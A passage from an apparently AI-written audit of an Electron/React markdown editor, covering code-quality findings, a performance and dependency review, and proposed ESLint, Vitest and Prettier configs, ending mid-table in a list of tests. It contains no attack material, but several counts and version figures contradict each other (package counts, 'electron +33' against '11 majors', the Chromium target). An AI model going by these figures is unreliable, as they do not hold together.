             isPinned: false, tags: i.tags ?? [], hasFileSystemHandle: !!i.fileHandle };
  }
  ```
  Delete `FileHistoryItem`, `getFileHistory`, `syncFileHistory`, and the `FILE_HISTORY` storage key.

#### [MED] A14. Dead state on `FileTab`; `cursorLine`/`cursorCol` are written once and never updated

- **File:** `src/types/index.ts:50-51`; `src/App.tsx:61, 156-157, 215-216, 372-373`
- **Code:**
  ```ts
  // types/index.ts — stored on the tab…
  cursorLine: number;
  cursorCol: number;
  // …but the live cursor lives here and is what StatusBar renders:
  const [cursorPos, setCursorPos] = useState({ line: 1, col: 1 });   // App.tsx:61
  // StatusBar reads cursorPos (App.tsx:940-941), never tab.cursorLine.
  ```
- **Problem / impact:** Two sources of truth for cursor position. `tab.cursorLine`/`cursorCol` are set at creation (`App.tsx:156-157`, `:215-216`, `:372-373`) and **never updated again** — `handleContentChange` (`:382-397`) doesn't touch them and `RawEditor.tsx:69` reports to `cursorPos`. So any future consumer of `tab.cursorLine` reads a value that is wrong after the first keypress. `StatusBar` also hardcodes `CRLF` (`:86`) regardless of actual line endings. `isDirty` is likewise stored (`:391`) when it is fully derivable.
- **Fix:** delete `cursorLine`/`cursorCol` from `FileTab`; make `isDirty` a selector (`s.content !== s.originalContent`); read line endings from the content.

#### [MED] A15. 87 props cross the App boundary — `CommandBar` takes 20

- **File:** `src/App.tsx:804-843` (`CommandBar`, 20 props), `:955-969` (`CommandPalette`, 13), `:849-859` (`HomePage`, 9); interfaces at `CommandBar.tsx:31-52`, `CommandPalette.tsx:19-33`, `HomePage.tsx:24-34`
- **Problem / impact:** 20 props at one boundary, of which **14 are callbacks**. Because none are memoized components (`React.memo` = 0 repo-wide), every prop change or parent render re-renders `CommandBar`, which re-renders ~40 inline `<button>` elements with long template-literal `className` strings. The same for `CommandPalette` (13 props) and `HomePage` (9). The 14 callbacks also defeat `CommandPalette`'s own `useMemo` (`CommandPalette.tsx:151-163`), as noted in A12.
- **Fix:** co-locate state with the components that own it (`CommandBar` owns `viewMode`/`fontSize` in a settings store; `CommandPalette` reads commands from a registry). Then `CommandBar` needs 3 props. Add `React.memo` to all 12 presentational components as a mechanical follow-up.

#### [MED] A16. `"clean": "rm -rf dist server.js"` fails on Windows — the app's own target OS

- **File:** `package.json:12`
- **Code:** `"clean": "rm -rf dist server.js"`
- **Problem / impact:** `rm` and `-rf` are Unix-only; `cmd.exe`/PowerShell on Windows has no `rm`. Running `npm run clean` on the developer's stated platform (`runs-on: windows-latest`) errors immediately. `server.js` also does not exist anywhere in the repository (verified against the full file listing) — it's a leftover from a removed Express server, evidence of the scaffolded origin.
- **Fix:** cross-platform, no dependency:
  ```json
  "clean": "node -e \"fs.rmSync('dist',{recursive:true,force:true});fs.rmSync('release',{recursive:true,force:true})\"",
  "clean": "rimraf dist release"
  ```
  Use `node -e` (zero new deps) or add `rimraf` as a devDependency.

#### [MED] A17. `bun.lock` committed, no `packageManager` field, CI installs with npm

- **File:** `bun.lock` (170 KB, committed); `package.json` (no `packageManager`); `.github/workflows/build-windows-exe.yml:32`
- **Code:**
  ```yaml
  run: |
    npm install --legacy-peer-deps --no-audit --no-fund
  ```
- **Problem / impact:** The lockfile is `bun.lock` (Bun text lockfile), but CI resolves with `npm install` — which **ignores `bun.lock` entirely** and does not write `package-lock.json` (not in the repo). So CI installs **unpinned, unpinned-and-unfrozen** dependency versions on every run, while the developer has a pinned graph. `--legacy-peer-deps` further suppresses the exact peer conflicts that A1 shows are real. Result: the build is non-reproducible and cannot currently succeed.
- **Fix:** pick one. Recommended — npm, since CI and scripts already assume it:
  ```bash
  rm bun.lock && npm install && git add package-lock.json
  ```
  ```json
  "packageManager": "npm@11.12.0",
  "engines": { "node": ">=20.19" }
  ```
  ```yaml
  - run: npm ci --no-audit --no-fund     # ci, not install — requires the lockfile
  ```
  If Bun is preferred, set `"packageManager": "bun@1.x"` and change the CI step to `oven-sh/setup-bun@v2` + `bun install --frozen-lockfile`.

#### [MED] A18. No tests, no runner — 4,372 lines of untested logic

- **File:** repo-wide (zero `*.test.*` / `*.spec.*` files; no `vitest`/`jest` dependency; no `test` script)
- **Problem / impact:** Nothing verifies the markdown renderer, the IDB repository, the search ranking, or the tab reducer. `.gitignore:4` already lists `coverage/`, so the intent existed and was never realised. The highest-risk code is exactly the untested code: `parseMarkdown` + custom renderers, `saveFileRecord`'s merge/dedupe logic (`storage.ts:115-137`), and `searchMarkdownFiles`' ranking. Any change to the `marked`/`highlight.js` upgrade path is a silent-regression risk.
- **Fix:** see **Recommended tooling setup**, then the 12 test cases in the backlog (items21-27).

#### [MED] A19. No virtualization — `RawEditor`'s gutter renders one `<div>` per line

- **File:** `src/components/RawEditor.tsx:332-336`
- **Code:**
  ```tsx
  {lines.map((_, i) => (<div key={i} className="h-6">{i + 1}</div>))}
  ```
- **Problem / impact:** Naive `.map()` with **no virtualizer**. A 5,000-line document creates 5,000 React elements **and** 5,000 DOM nodes; a 100,000-line document creates 100,000. This is the hard ceiling on document size, and it is hit long before parsing becomes the bottleneck. Note `key={i}` on a list that changes size is also a reconciliation hazard. The same pattern applies to `TabBar.tsx:47` (`tabs.map`), `HomePage.tsx:431` (`recentFiles.map` — a `<tr>` per record, unbounded), `CommandPalette.tsx:232`, and `SampleFilesModal.tsx:48`.
- **Fix:** virtualize the gutter and the preview. `@tanstack/react-virtual` (latest v3) for the gutter; for the preview, render `marked` output into a chunked list of block elements (split on top-level `\n\n`) each with its own `useMemo`, so only the visible window re-parses. Cap `recentFiles` in the table at 200 rows behind a "show all".

#### [MED] A20. `useEffect` dependency bugs that `eslint-plugin-react-hooks` would have caught

- **File:** `src/App.tsx:144-163`, `src/App.tsx:170-237`, `src/App.tsx:641-672`
- **Code:**
  ```ts
  // App.tsx:143 — reads `tabs` inside, but the dep array is []
  useEffect(() => {
    getRecentFiles().then((files) => {
      setRecentFiles(files);
      if (files.length > 0 && tabs.length === 0) { ...setTabs([newTab]); }
    });
  }, []);
  ```
  ```ts
  // App.tsx:641-672 — the hotkey effect re-registers a window listener
  // every time `activeTab`/`tabs`/`recentFiles` change identity.
  }, [handleSave, handleSaveAs, handleOpenLocalFile, handleNewFile, handleCloseTab, activeTabId]);
  ```
- **Problem / impact:** (1) The hydration effect closes over a stale `tabs` (always `[]`); it works by accident on a cold mount but would double-open if the effect ever re-ran. (2) `handleSave` depends on `[activeTab, recentFiles, showToast]` (`App.tsx:496`) and `handleCloseTab` on `[tabs, activeTabId, showToast]` (`App.tsx:608`) — **both change identity on every keystroke**, so `removeEventListener`/`addEventListener` on `window` churns continuously while typing. (3) `MarkdownPreview.tsx:117` lists both `htmlContent` and `content` in its click-listener effect, so the listener is re-attached on every keystroke. (4) `handleInsertMarkdown` (`App.tsx:631-638`) has a side effect (`setTimeout`) inside a `useCallback` and no cleanup. (5) `showToast` (`App.tsx:73-78`) leaks its timer on unmount and its `prev === msg` guard (`App.tsx:76`) misbehaves when the same message fires twice. There are **17 `setTimeout` calls** and not one `clearTimeout`.
- **Fix:** move the hotkey registry to a stable module constant and register once:
  ```ts
  // hooks/useHotkeys.ts
  type Handler = (e: KeyboardEvent) => void;
  const registry = new Map<string, Handler>();       // stable across renders
  export function useHotkeys(): void {
    const ref = useRef(registry); useEffect(() => ref.current = registry, []);
    useEffect(() => {
      const onKey = (e: KeyboardEvent) => {
        const key = [e.ctrlKey || e.metaKey ? 'mod' : '', e.shiftKey ? 'shift' : '', e.key.toLowerCase()]
          .filter(Boolean).join('+');
        ref.current.get(key)?.(e);
      };
      window.addEventListener('keydown', onKey);
      return () => window.removeEventListener('keydown', onKey);
    }, []);                                            // registered exactly once
  }
  ```
  Fix `showToast` with a ref-held timer id and `clearTimeout` in the cleanup.

#### [LOW] A21. `@types/*` in `dependencies`, build tooling in `dependencies`, and 6 genuinely unused packages

- **File:** `package.json:34-66`
- **Code:**
  ```json
  "dependencies": {
    "@google/genai": "^2.4.0", "@types/canvas-confetti": "^1.9.0", "@types/jszip": "^3.4.1",
    "@tailwindcss/vite": "^4.3.3", "@vitejs/plugin-react": "^6.1.1", "dotenv": "^17.2.3",
    "express": "^4.21.2", "jszip": "^3.10.2", "motion": "^12.23.24",
    "tailwindcss": "^4.3.3", "vite": "^8.3.0", "vite-plugin-pwa": "^2.0.0"
  }
  ```
- **Problem / impact:** Four distinct packaging bugs.
  1. **`@types/*` in `dependencies`** — `@types/canvas-confetti` and `@types/jszip` ship to end users' `node_modules` as if they were runtime libraries. Type packages belong in `devDependencies`.
  2. **Build tooling in `dependencies`** — `vite`, `@vitejs/plugin-react`, `@tailwindcss/vite`, `tailwindcss`, `vite-plugin-pwa` are imported only by `vite.config.ts` (`vite.config.ts:1,2,5`) or by npm scripts. They bloat the production tree and, under electron-builder's `files: ["dist/**/*", "electron/**/*"]` (`package.json:23-26`), are excluded from the asar — but they still get installed on every contributor machine and in CI for no reason.
  3. **Six packages imported nowhere** (verified against the complete unique-import list for `src/`): `@google/genai`, `express`, `dotenv`, `jszip`, `motion`, `autoprefixer`, plus `esbuild` (transitive of vite, shouldn't be pinned — see A1) and `tsx` (no scripts reference it). **Correction to a common assumption: `canvas-confetti` IS used** — `App.tsx:7`, invoked at `:454` and `:555` — and `@types/canvas-confetti` is therefore legitimately needed, just in the wrong section. `@types/express` and `@types/jszip` are needed only by the packages that are themselves unused.
  4. **Stale AI scaffolding** — `metadata.json:5` advertises `"MAJOR_CAPABILITY_SERVER_SIDE_GEMINI_API"` and `.env.example:4` documents `GEMINI_API_KEY`, but **there is zero AI code in the repository** and nothing reads `process.env.GEMINI_API_KEY`. `dotenv` is never loaded. `App.tsx` has no AI responsibility despite the audit brief listing "AI" — I verified: no `genai`, no `fetch` to any model endpoint anywhere in `src/`.
- **Fix:**
  ```jsonc
  "dependencies": { "idb-keyval": "^6.3.0", "marked": "^18.0.14", "react": "^19.3.1",
                    "react-dom": "^19.3.1", "canvas-confetti": "^1.9.4", "highlight.js": "^11.12.0",
                    "lucide-react": "^1.52.0" },
  "devDependencies": { "@types/canvas-confetti": "^1.9.0", "@types/node": "^22.14.0",
                       "@types/react": "^19.3.0", "@types/react-dom": "^19.3.0",
                       "@tailwindcss/vite": "^4.3.3", "@vitejs/plugin-react": "^6.1.1",
                       "autoprefixer": "^10.4.21", "electron": "^33.2.1",
                       "electron-builder": "^25.1.8", "tailwindcss": "^4.3.3",
                       "vite": "^8.3.0", "vite-plugin-pwa": "^2.0.0",
                       "typescript": "^7.0.2", "vitest": "^3", "@vitest/coverage-v8": "^3",
                       "@testing-library/react": "^16", "@testing-library/user-event": "^14",
                       "happy-dom": "^17", "eslint": "^9", "typescript-eslint": "^8",
                       "eslint-plugin-react-hooks": "^5", "eslint-plugin-react-refresh": "^0.4",
                       "prettier": "^3", "lint-staged": "^15", "husky": "^9" },
 "overrides": { "esbuild": "^0.28.2" }
  ```
  Delete `@google/genai`, `express`, `@types/express`, `dotenv`, `jszip`, `@types/jszip`, `motion`, `tsx`. Keep `autoprefixer` **only** if you re-add it to `postcss` config — it is currently inert (Tailwind v4 does not use it; delete it). Delete `metadata.json` and `.env.example`, or replace with a real `.env.example` if AI is ever added back.

#### [LOW] A22. Version pins: mostly current, two frozen, one 11 majors behind

- **File:** `package.json:35-66`
- **Problem / impact:** Verified against the live registry via `npm view <pkg> version`.
  - **`lucide-react: ^0.546.0` → latest `1.52.0`.** Caret on a `0.x` version means `>=0.546.0 <0.547.0`, so this **can never** reach 1.x. The app is locked to a pre-1.0 range indefinitely.
  - **`electron: ^33.2.1` → latest `44.5.1`.** Caret holds it at 33.x (last33.x is `33.4.11`). That is **11 major versions** and multiple LTS cycles behind — no current Chromium security patches. For a local-file editor this is the most security-relevant staleness in the file.
  - `motion: ^12.23.24` → latest `14.0.0` (frozen in 12.x) — moot, delete it.
  - `express: ^4.21.2` → latest `5.2.1` — moot, delete it.
  - Everything else is current or resolves forward within range: `vite ^8.3.0` → `8.3.2`, `typescript ^7.0.2` → `7.0.2` (latest), `@vitejs/plugin-react ^6.1.1` → `6.1.1` (latest), `marked ^18.0.14` → `18.0.14` (latest), `tailwindcss`/`@tailwindcss/vite ^4.3.3` → `4.3.3`, `vite-plugin-pwa ^2.0.0` → `2.0.0`, `highlight.js ^11.12.0` → `11.12.0`, `@google/genai ^2.4.0` → `2.27.0`, `react ^19.0.1` → `19.3.0`.
  - **Explicitly verified as NOT prerelease:** `vite@8.3.0` is on the `latest` dist-tag (`beta: 8.3.0-beta.1` is a separate tag); `typescript@7.0.2` is `latest` (`rc: 7.0.1-rc` is separate). So the `vite ^8.3.0` / `typescript ^7.0.2` / `@vitejs/plugin-react ^6.1.1` pins are **real stable releases at or one patch behind current** — not phantom or prerelease versions.
- **Fix:** `npm install electron@^44 lucide-react@^1`, then re-test the FS Access path (Chromium changed `showOpenFilePicker` permission semantics across majors).

#### [LOW] A23. `FileSystemFileHandle` in React state defeats `Object.freeze`/dev-mode identity checks

- **File:** `src/types/index.ts:52`; `src/App.tsx:217, 291, 549`
- **Code:** `fileHandle?: FileSystemFileHandle;`
- **Problem / impact:** Storing a platform handle inside the tab object means the whole tab object is now non-serializable. That breaks zustand's default `persist`, breaks any future devtools time-travel, and — because `handleContentChange` does `prev.map((t) => t.fileId === id ? {...t, content} : t)` (`App.tsx:385-396`) — a **new tab object is allocated on every keystroke**, invalidating every memo boundary keyed on the tab. Keep handles in a separate `Map<string, FileSystemFileHandle>` (`handlesRef` / a non-reactive store) so tab objects stay plain data.

#### [LOW] A24. Path alias `@/*` configured in both places but used zero times

- **File:** `tsconfig.json:19-23`; `vite.config.ts:56-60`
- **Code:**
  ```ts
  "paths": { "@/*": ["./*"] }                          // tsconfig — no "baseUrl"
  resolve: { alias: { '@': __dirname } }              // vite — correctly mirrored
  ```
- **Problem / impact:** Good news: the alias **is** mirrored in `vite.config.ts:58`, which is the common break people warn about — so this is not broken today. But the entire `src/` tree uses relative imports (`'./components/TabBar'`, `'../services/markdown'`); grepping the full import list finds **zero** `@/` imports. It's dead configuration. Also `paths` without `baseUrl` works only because `moduleResolution: "bundler"` relaxes the rule; it's fragile config to leave lying around.
- **Fix:** pick one and use it. Convert `src/` to `@/…` imports (recommended —22 files, mechanical) or delete both entries. Either way the two configs must stay in sync; add a test that asserts it:
  ```ts
  // tests/config.test.ts
  it('vite alias matches tsconfig paths', async () => {
    const cfg = await import('../vite.config');
    expect(cfg.default.resolve.alias['@']).toBeDefined();
  });
  ```

#### [LOW] A25. No `build` output config: no manual chunks, no build target, source maps unstated

- **File:** `vite.config.ts:9-66`
- **Problem / impact:** `build` is entirely absent, so: no `target` (defaults to Vite's baseline, not the Chromium version Electron 33 actually ships — a mismatch risk), no `sourcemap` (ambiguous: absent means hidden in prod, which is fine, but it should be *decided*), no `manualChunks`, no `chunkSizeWarningLimit`. PWA config is otherwise correct: `base: './'` (`vite.config.ts:11`) is **required** for `loadFile` in Electron and is right; `registerType: 'autoUpdate'` is right for a desktop app; icons and maskable are declared. One flaw: `devOptions: { enabled: true }` (`vite.config.ts:50-53`) turns the service worker on during dev, which caches stale assets and is a known source of "my change didn't appear" confusion.
- **Fix:**
  ```ts
  export default defineConfig({
    base: './',
    plugins: [react(), tailwindcss(), VitePWA({ /* ...existing manifest... */,
      devOptions: { enabled: false } })],
    resolve: { alias: { '@': __dirname } },
    server: { host: '127.0.0.1', port: 3000, strictPort: true },
    build: {
      target: 'chrome128',                       // Electron 33 = Chromium 130
      sourcemap: false,                          // explicit; Electron DevTools works without
      chunkSizeWarningLimit: 400,
      rollupOptions: {
        output: {
          manualChunks: {
            react:    ['react', 'react-dom'],
            markdown: ['marked'],                 // hljs left out — see A2
            editor:   ['highlight.js/lib/core'],  // only after the core-register refactor
          },
        },
      },
    },
  });
  ```

#### [LOW] A26. Missing project hygiene files

- **File:** repo root (verified absent from the full file listing)
- **Problem / impact:** No `README.md`, `LICENSE`, `CONTRIBUTING.md`, `CHANGELOG.md`, `.editorconfig`, `.nvmrc`, `.prettierrc`, `eslint.config.js`, husky hooks, or semantic-release config. `package.json:6` has `"private": true` — that is **correct and intentional** for electron-builder (it prevents accidental npm publish and silences the "publish" check in `npm publish`), but it also means `version` is never enforced against a changelog. The `SPDX-License-Identifier: Apache-2.0` header in `App.tsx:2-4` claims a license that **no `LICENSE` file backs** — that's a real legal exposure if you ever distribute the `.exe`.
- **Fix:** add `LICENSE` (Apache-2.0, matching the SPDX header), `README.md` (install/build/test/run), `.editorconfig`, `.nvmrc` (`22`), and run `npx husky init` + `lint-staged` (config below).

#### [LOW] A27. Unused hook, unused exports, unused state- **File:** `src/hooks/usePWAInstall.ts` (whole file); `src/services/storage.ts:70-91`; `src/components/*` unused icon imports
- **Problem / impact:** `src/hooks/usePWAInstall.ts` (62 lines) is **imported nowhere** — not in the complete import list. It's also dead by design: PWA install prompt is irrelevant inside the Electron shell. Delete the directory. `getFileHistory` (`storage.ts:70`) is exported and never imported. `FileHistoryItem` (`types/index.ts:3-11`) is only used by that dead code. `AccentColor` (`types/index.ts:55`) and three of the eight `AppSettings` fields (`accentColor`, `lineNumbers`, `defaultViewMode`, `autoSave`) are never read — `DEFAULT_SETTINGS` (`storage.ts:12-21`) declares 8 fields but `App.tsx:110-111` reads only 4. Unused icon imports: `Command` (`ShortcutsModal.tsx:2`), `Download` (`ImageLightboxModal.tsx:2`), `CheckCircle`/`Laptop`/`ExternalLink`/`HardDrive` (`HomePage.tsx:10,11,9`), `Download` (`CommandPalette.tsx:11`).
- **Fix:** delete them; let `noUnusedLocals` (A8) + ESLint catch the next batch automatically.

---

### Performance & bundle analysis

**Memoization census (whole repo, `src/`, 22 files):**

| Primitive | Count | Assessment |
|---|---|---|
| `React.memo` | **0** | No component is memoized. Every one of the 12 presentational components re-renders whenever `App` does. |
| `React.lazy` / `Suspense` | **0** / **0** | No code splitting. One bundle. |
| `useMemo` | **10** | 5 in `App` (all invalidated by their own deps), 1 in `MarkdownPreview` (0% hit rate — dep is the keystroke), 2 in `HomePage` (valid), 2 in `StatusBar`/`ExportModal`. |
| `useCallback` | **19** | 16 in `App`, 3 in `RawEditor`. Several have identities that change on every keystroke (A20), so they defeat memoization rather than enable it. |
| `useState` | **42** | 15 in `App` alone. |
| `useEffect` | **15** | 6 in `App`; `MarkdownPreview`'s listener effect re-attaches per keystroke. |
| `useReducer` / `createContext` | **0** / **0** | No context, no reducer, no store library. |
| Debounce | **0** | 17 `setTimeout`s, 0 `clearTimeout`s, 0 debounce helpers. |

**What happens on one keystroke (Split mode, a 200 KB doc with 20 code fences):**

1. `RawEditor` `onChange` → `App.handleContentChange` → `setTabs` → new `tabs` array → **`App` re-renders** (no memo boundary anywhere).
2. All 12 children re-render, including `TabBar` (rebuilding N tab divs), `CommandBar` (rebuilding ~40 buttons with template-literal classNames), `StatusBar`, `HomePage` (if visible), and the 5 modals — **which are always mounted**, `ExportModal`/`CommandPalette`/`SampleFilesModal`/`ShortcutsModal` return `null` on `isOpen` but still execute their bodies including `ExportModal.tsx:25-28`'s `parseMarkdown`.
3. `MarkdownPreview`'s `useMemo` misses (dep = the new `content`) → `marked.parse` + `hljs.highlightAuto` × 20 unlabelled blocks × ~190 grammars.
4. `dangerouslySetInnerHTML` replaces the entire preview DOM subtree → full teardown/rebuild → scroll position reset.
5. `RawEditor.tsx:44` re-splits content into lines; `:332` re-renders one `<div>` per line.
6. `StatusBar.tsx:20` re-runs `calculateWordCount` (regex tokenization allocating an array of every word).
7. `App.tsx:672`'s hotkey effect re-runs `removeEventListener`+`addEventListener` on `window`, because `handleSave`/`handleCloseTab` identities just changed.

Steps 3 and 4 dominate. Steps 2 and 7 are pure waste — roughly 40 buttons and one window listener that could never have changed.

**Search cost (measured by inspection, all O(corpus) per keystroke, none debounced):**
- `HomePage.tsx:52-55` → `searchMarkdownFiles` → `search.ts:17` `file.content.split('\n')` for **every** file + per-line `indexOf`. Allocating an array of every line in the corpus per keystroke.
- `CommandPalette.tsx:66` → `f.content.toLowerCase()` for **every** file per keystroke — a full lowercase copy allocation per file per keypress. Its `useMemo` (`:151-163`) lists 10 callbacks that change identity on every `App` render, so the memo never holds.
- `RawEditor.tsx:182-197` → full-document `toLowerCase()` + `indexOf` loop per keystroke, pushing an **unbounded** match-offset array.
- A 200 KB corpus at 10 keystrokes/sec = ~2 MB of lowercase copies per second plus a full line-array allocation per keystroke. On a 10 MB corpus this is the app's dominant hang.

**Bundle:** *not measured — the install fails (A1), so no `npm run build` could complete and `dist/` does not exist.* The structural facts are certain regardless:

- `highlight.js` main entry (`markdown.ts:2`) — statically imported, pulls **every** bundled grammar (~190) plus `highlightAuto`'s runtime. Refactor to `lib/core` + 7 explicit registrations (A2) and additionally move the whole module behind `React.lazy` so it never loads for raw-only sessions.
- `@google/genai` is **not in the bundle** — it is never imported (A21). The fix is deletion, not dynamic import. It currently only bloats `node_modules` and install time.
- `jszip`, `motion`, `express`, `dotenv` — also never imported; not in the bundle, pure install weight.
- `canvas-confetti` — statically imported at `App.tsx:7`, used twice. Small (~7 kB) but trivially `await import('canvas-confetti')` inside the save handler so it only loads when a save actually succeeds.
- `lucide-react` —60+ named icon imports across 12 files; the package is tree-shakeable and `^0.546.0` is frozen below 1.x (A22). Verify the shake actually happened after upgrading.
- **No `manualChunks`** (A25) → one flat bundle. Adding the `react`/`markdown`/`editor` split is the single highest-leverage build change.
- `index.css:2` imports only `github-dark.css` — light theme code blocks ship unstyled.

---

### Dependency audit

| Dep | Pinned | Latest | Imported? | Verdict |
|---|---|---|---|---|
| `react` | `^19.0.1` | `19.3.0` | ✅ `main.tsx:1`, 12 files | Keep, bump to `^19.3.1` |
| `react-dom` | `^19.0.1` | `19.3.0` | ✅ `main.tsx:1` | Keep, bump |
| `marked` | `^18.0.14` | `18.0.14` ✅ exact | ✅ `markdown.ts:1` | Keep (pinned at latest) |
| `highlight.js` | `^11.12.0` | `11.12.0` ✅ exact | ⚠️ `markdown.ts:2` **full import** | Keep, **refactor to `lib/core`** (A2) |
| `lucide-react` | `^0.546.0` | `1.52.0` | ✅ 12 files | **Upgrade to `^1.52.0`** — caret on 0.x can never reach 1.x (A22) |
| `idb-keyval` | `^6.3.0` | `6.3.0` | ✅ `storage.ts:1` | Keep — the only real storage dep |
| `canvas-confetti` | `^1.9.4` | `1.9.4` ✅ exact | ✅ `App.tsx:7`, used `:454`,`:555` | Keep — **not dead weight**; move to dynamic `import()` |
| `vite` | `^8.3.0` | `8.3.2` | ⚠️ `vite.config.ts` + scripts | Keep; **move to devDependencies**; add `build` block (A25) |
| `typescript` | `^7.0.2` | `7.0.2` ✅ exact | ⚠️ `tsc --noEmit` | Keep (latest stable, **not** a prerelease); enable `strict` (A8) |
| `@vitejs/plugin-react` | `^6.1.1` | `6.1.1` ✅ exact | ✅ `vite.config.ts:2` | Move to devDependencies |
| `tailwindcss` | `^4.3.3` | `4.3.3` ✅ exact | ✅ via `@tailwindcss/vite` | Move to devDependencies |
| `@tailwindcss/vite` | `^4.3.3` | `4.3.3` ✅ exact | ✅ `vite.config.ts:1` | Move to devDependencies. **Config is correct for v4** |
| `vite-plugin-pwa` | `^2.0.0` | `2.0.0` ✅ exact | ✅ `vite.config.ts:5` | Move to devDependencies; set `devOptions.enabled: false` |
| `electron` | `^33.2.1` | **`44.5.1`** | ✅ `electron/main.cjs:1` | **CRITICAL: 11 majors behind**, no current Chromium security patches. Upgrade to `^44` (A22) |
| `electron-builder` | `^25.1.8` | `26.15.3` | ✅ `package.json:14,40` | Bump; add `npmRebuild`, `asar`, code-signing config |
| `@types/react` | `^19.3.0` | — | ✅ | devDependencies ✅ (already correct) |
| `@types/react-dom` | `^19.3.0` | — | ✅ | devDependencies ✅ |
| `@types/node` | `^22.14.0` | — | ⚠️ needed for `vite.config.ts` | devDependencies ✅ |
| `@types/canvas-confetti` | `^1.9.0` | `1.9.0` | type-only, **in `dependencies`** | **Move to devDependencies** (A21) |
| **`@google/genai`** | `^2.4.0` | `2.27.0` | ❌ **nowhere** | **DELETE.** Zero AI code exists; `metadata.json` + `.env.example` are stale |
| **`jszip`** | `^3.10.2` | `3.10.2` | ❌ **nowhere** | **DELETE** |
| **`@types/jszip`** | `^3.4.1` | `3.4.1` | ❌ types for an unused pkg | **DELETE** |
| **`express`** | `^4.21.2` | `5.2.1` | ❌ **nowhere** | **DELETE** (leftover from removed server; `clean` script still refs `server.js`) |
| **`@types/express`** | `^4.17.21` | `5.0.6` | ❌ types for an unused pkg | **DELETE** (also already in devDependencies ✅) |
| **`dotenv`** | `^17.2.3` | `18.0.5` | ❌ **nowhere** | **DELETE** — nothing reads `process.env.GEMINI_API_KEY` |
| **`motion`** | `^12.23.24` | `14.0.0` | ❌ **nowhere** | **DELETE.** `animate-*` classes in JSX come from `tw-animate-css`-style CSS, not this package |
| **`esbuild`** | `^0.25.0` | `0.28.2` | ⚠️ transitive of vite | **REMOVE the pin — this is what breaks `npm install`** (A1). Use `overrides: { esbuild: "^0.28.2" }` |
| **`tsx`** | `^4.21.0` | `4.23.15` | ❌ no script uses it | **DELETE.** It is also half the cause of the A1 install failure |
| **`autoprefixer`** | `^10.4.21` | `10.6.1` | ❌ **nowhere** | **DELETE.** Inert under Tailwind v4 (which uses Lightning CSS) — no `postcss.config.*` exists |

**Net result: 9 packages deleted, 7 moved `dependencies`→`devDependencies`, 2 upgraded across majors (`electron` +33, `lucide-react` +1), 1 dependency-tree conflict removed (`esbuild`).**

---

### Recommended tooling setup

```jsonc
// package.json scripts
{
  "scripts": {
    "dev": "vite --port=3000",
    "build": "tsc --noEmit && vite build",
    "preview": "vite preview",
    "clean": "node -e \"fs.rmSync('dist',{recursive:true,force:true});fs.rmSync('release',{recursive:true,force:true})\"",
    "lint": "eslint .",
    "lint:fix": "eslint . --fix",
    "format": "prettier --write .",
    "format:check": "prettier --check .",
    "typecheck": "tsc --noEmit",
    "test": "vitest run",
    "test:watch": "vitest",
    "test:coverage": "vitest run --coverage",
    "prepare": "husky",
    "electron:build": "npm run build && electron-builder --win",
    "electron:dev": "concurrently -k \"vite\" \"wait-on tcp:3000 && electron .\""
  },
  "lint-staged": {
    "*.{ts,tsx}": ["eslint --fix", "prettier --write"],
    "*.{json,css,html,md,yml}": ["prettier --write"]
  }
}
```

```js
// eslint.config.js  (flat config, ESLint 9 — no .eslintrc)
import js from '@eslint/js';
import globals from 'globals';
import tseslint from 'typescript-eslint';
import reactHooks from 'eslint-plugin-react-hooks';
import reactRefresh from 'eslint-plugin-react-refresh';

export default tseslint.config(
  { ignores: ['dist', 'release', 'node_modules', 'coverage'] },
  js.configs.recommended,
  ...tseslint.configs.recommendedTypeChecked,
  {
    files: ['**/*.{ts,tsx}'],
    languageOptions: {
      parserOptions: { projectService: true, tsconfigRootDir: import.meta.dirname },
      globals: { ...globals.browser, ...globals.node },
    },
    plugins: { 'react-hooks': reactHooks, 'react-refresh': reactRefresh },
    rules: {
      ...reactHooks.configs.recommended.rules,
      'react-refresh/only-export-components': ['warn', { allowConstantExport: true }],
      '@typescript-eslint/no-explicit-any': 'error',
      '@typescript-eslint/consistent-type-imports': 'error',
      '@typescript-eslint/no-floating-promises': 'error',
      '@typescript-eslint/no-misused-promises': 'error',
      'no-console': ['warn', { allow: ['warn', 'error'] }],
      eqeqeq: ['error', 'smart'],
    },
  },
  { files: ['electron/**/*.cjs'], ...tseslint.configs.disableTypeChecked,
    languageOptions: { globals: globals.node, sourceType: 'commonjs' } },
);
```

```json
// .prettierrc.json
{ "semi": true, "singleQuote": true, "trailingComma": "es5", "printWidth": 100,
  "tabWidth": 2, "arrowParens": "always" }
```

```jsonc
// vitest.config.ts
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';
import tailwindcss from '@tailwindcss/vite';
export default defineConfig({
  plugins: [react(), tailwindcss()],
  resolve: { alias: { '@': new URL('./src', import.meta.url).pathname.replace(/\//g, '\\') } },
  test: {
    environment: 'happy-dom',
    globals: true,
    setupFiles: ['./tests/setup.ts'],
    coverage: { provider: 'v8', reporter: ['text', 'html'], thresholds: { lines: 70, functions: 70 } },
  },
});
```

```ts
// tests/setup.ts
import '@testing-library/jest-dom/vitest';
import { afterEach, vi } from 'vitest';
import { cleanup } from '@testing-library/react';

afterEach(() => { cleanup(); vi.restoreAllMocks(); });

// matchMedia / matchers absent in happy-dom
window.matchMedia = vi.fn().mockImplementation(q => ({ matches: false, media: q,
  addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {},
  dispatchEvent: () => false, onchange: null }));
// idb-keyval + FS Access API fakes live in tests/fakes/
```

**12 highest-value tests, first batch:**

| # | Test | Target file |
|---|---|---|
| 1 | `calculateWordCount`/`calculateReadingTime`/`formatFileSize`/`formatTimestamp` incl. empty, CJK, emoji, 10 MB | `src/services/markdown.ts` |
| 2 | `parseMarkdown`: headings/lists/tables/task-lists, code fence w/ known lang, blockquote w/ nested emphasis, **malformed input must not throw** | `src/services/markdown.ts` |
| 3 | Custom renderer `image()` sanitises `href`/`text` against `javascript:` and quote-breakout | `src/services/markdown.ts` |
| 4 | `highlight()` returns escaped HTML for `<script>` inside a code fence | `src/services/markdown/highlight.ts` |
| 5 | `searchMarkdownFiles`: ranking by `matchesCount` → `lastOpened`; ≤4 snippets/file; name-only match synthesises a snippet; empty query returns `[]`; corpus of 1 MB runs<50 ms | `src/services/search.ts` |
| 6 | `saveFileRecord` merge by `id` **and** by `path`; dedupes; preserves `isPinned`/`tags`; `saveFileRecord` twice does not duplicate | `src/services/storage.ts` |
| 7 | IDB unavailable → `getRecentFiles` falls back to localStorage; localStorage throws `QuotaExceededError` → returns `[]`, **does not reject** | `src/services/storage.ts` |
